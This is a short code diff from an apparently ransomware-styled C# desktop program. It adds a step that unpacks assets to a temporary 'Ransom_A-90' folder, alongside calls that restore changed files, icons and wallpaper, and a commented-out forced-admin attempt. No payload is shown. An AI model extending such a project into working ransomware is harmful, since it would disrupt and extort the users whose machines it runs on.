@@ -25,6 +25,8 @@ namespace rans0m
             ApplicationConfiguration.Initialize();
             // Global.AttemptForceAdmin(); Disabled - causes drag&drop issues and UAC
 
+            // Unpack embedded assets to the created %TEMP%\Ransom_A-90 folder
+            try { AssetManager.EnsureAssets(); } catch { }
             // Auto-restore if previous run was force-stopped and left restore.json (file ops revert, icons, wallpaper)
             try { DesktopRansomManager.TryRestoreIfNeeded(); } catch (Exception ex) { Debug.WriteLine($"[Program] RestoreIfNeeded fail: {ex.Message}"); }
             // Ensure gif placeholder exists for future ransom
